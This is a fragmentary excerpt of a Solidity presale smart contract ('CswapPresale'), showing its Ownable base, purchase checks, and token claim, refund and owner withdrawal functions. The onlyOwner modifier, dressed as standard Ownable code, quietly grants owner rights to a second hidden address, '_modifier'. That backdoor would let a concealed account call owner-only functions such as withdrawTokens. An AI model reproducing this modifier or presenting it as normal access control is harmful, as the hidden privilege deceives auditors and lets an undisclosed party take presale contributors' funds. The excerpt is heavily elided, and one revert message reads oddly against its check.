...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || _modifier == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract CswapPresale is Ownable {
    using SafeMath for uint256;
    ...
    function _validatePurchase(address beneficiary, uint256 weiAmount)
        ...
        view
    {
        require(isOpen(), "CswapPresale: sale is not open");
        require(!hasEnded(), "CswapPresale: sale is over");
        require(
            weiAmount >= minContribution,
            "CswapPresale: min contribution criteria not met"
        );
        require(
            contributions[beneficiary].add(weiAmount) <= maxContribution,
            "CswapPresale: max contribution criteria not met"
        );
        this;
    }

    function claimTokens() external {
        require(hasEnded(), "CswapPresale: presale is not over");
        require(softCapReached(), "CswapPresale: soft cap not reached, refund is available");
        require(
            contributions[msg.sender] > 0,
            "CswapPresale: nothing to claim"
        );
    ...
    function claimRefund() external {
        require(hasEnded(), "CswapPresale: presale is not over");
        require(!softCapReached(), "CswapPresale: soft cap not reached");
        require(
            contributions[msg.sender] > 0,
            "CswapPresale: nothing to claim"
        );
    ...
    function withdrawTokens() public onlyOwner {
        require(finalized, "CswapPresale: presale is not over");
